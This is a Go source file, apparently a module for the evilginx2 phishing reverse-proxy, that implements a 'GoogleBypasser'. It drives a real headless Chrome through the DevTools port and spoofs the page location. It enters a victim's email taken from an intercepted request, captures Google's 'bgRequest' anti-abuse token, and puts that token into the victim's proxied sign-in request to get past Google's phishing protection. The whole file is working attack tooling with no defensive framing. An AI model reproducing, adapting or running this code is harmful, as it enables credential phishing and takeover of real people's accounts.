//sudo apt update && sudo apt install -y xvfb google-chrome-stable
//Xvfb :99 -screen 0 1920x1080x24 & export DISPLAY=:99
//go get github.com/go-rod/rod 
// github.com/go-rod/rod/lib/input 
// github.com/go-rod/rod/lib/proto 
// github.com/EvilWhales/RProxy-LAB/evilginx-pro


package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

type GoogleBypasser struct {
	browser       *rod.Browser
	page          *rod.Page
	isHeadless    bool
	withDevTools  bool
	slowMotionTime time.Duration
	token         string
	email         string
}

var bgRegexp = regexp.MustCompile(`"bgRequest":"([^"]+)"`) // Updated for v3

func getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}
	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}
	return targets[0]["webSocketDebuggerUrl"].(string), nil
}

func (b *GoogleBypasser) Launch() {
	log.Debug("[GoogleBypasser]: Launching Browser...")
	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		log.Error("Failed to get WebSocket debugger URL: %v", err)
		return
	}
	b.browser = rod.New().ControlURL(wsURL)
	if b.slowMotionTime > 0 {
		b.browser = b.browser.SlowMotion(b.slowMotionTime)
	}
	b.browser = b.browser.MustConnect()
	b.page = b.browser.MustPage()
	log.Debug("[GoogleBypasser]: Browser connected and page created.")

	b.page.MustEvalOnNewDocument(`
		Object.defineProperty(window, 'location', {
			value: { hostname: 'accounts.google.com' },
			writable: false
		});
	`)
}

func (b *GoogleBypasser) GetEmail(body []byte) {
	exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`); // Updated
	email_match := exp.FindSubmatch(body)
	if len(email_match) < 2 {
		log.Error("[GoogleBypasser]: Found %v matches for email in request.", len(email_match))
		return
	}
	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
	log.Debug("[GoogleBypasser]: Using email: %v", b.email)
}

func (b *GoogleBypasser) GetToken() {
	stop := make(chan struct{})
	var once sync.Once
	timeout := time.After(200 * time.Second)

	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(e.Request.URL, "rpcids=V1UmUe") {
			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
			if err != nil {
				log.Error("Failed to decode body: %v", err)
				return
			}
			matches := bgRegexp.FindStringSubmatch(decodedBody)
			if len(matches) > 1 {
				b.token = matches[1] // Updated
				log.Debug("[GoogleBypasser]: Obtained Token: %v", b.token)
				once.Do(func() { close(stop) })
			}
		}
	})()

	log.Debug("[GoogleBypasser]: Navigating to Google login page...")
	if err := b.page.Navigate("https://accounts.google.com/"); err != nil {
		log.Error("Failed to navigate: %v", err)
		return
	}

	log.Debug("[GoogleBypasser]: Waiting for email input...")
	emailField := b.page.MustWaitLoad().MustElement("#identifierId")
	if emailField == nil {
		log.Error("Failed to find email input field")
		return
	}
	if err := emailField.Input(b.email); err != nil {
		log.Error("Failed to input email: %v", err)
		return
	}
	log.Debug("[GoogleBypasser]: Entered email: %v", b.email)
	if err := b.page.Keyboard.Press(input.Enter); err != nil {
		log.Error("Failed to submit form: %v", err)
		return
	}
	log.Debug("[GoogleBypasser]: Submitted login form...")

	select {
	case <-stop:
		for b.token == "" {
			select {
			case <-time.After(1 * time.Second):
				log.Debug("[GoogleBypasser]: Waiting for token...")
			case <-timeout:
				log.Error("[GoogleBypasser]: Timed out waiting for token")
				return
			}
		}
		if err := b.page.Close(); err != nil {
			log.Error("Failed to close page: %v", err)
		}
	case <-timeout:
		log.Error("[GoogleBypasser]: Timed out waiting for token")
	}
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	log.Debug("[GoogleBypasser]: Old body: %v", string(body))
	newBody := bgRegexp.ReplaceAllString(string(body), `"bgRequest":"`+b.token+`"`)
	log.Debug("[GoogleBypasser]: New body: %v", newBody)
	return []byte(newBody)
}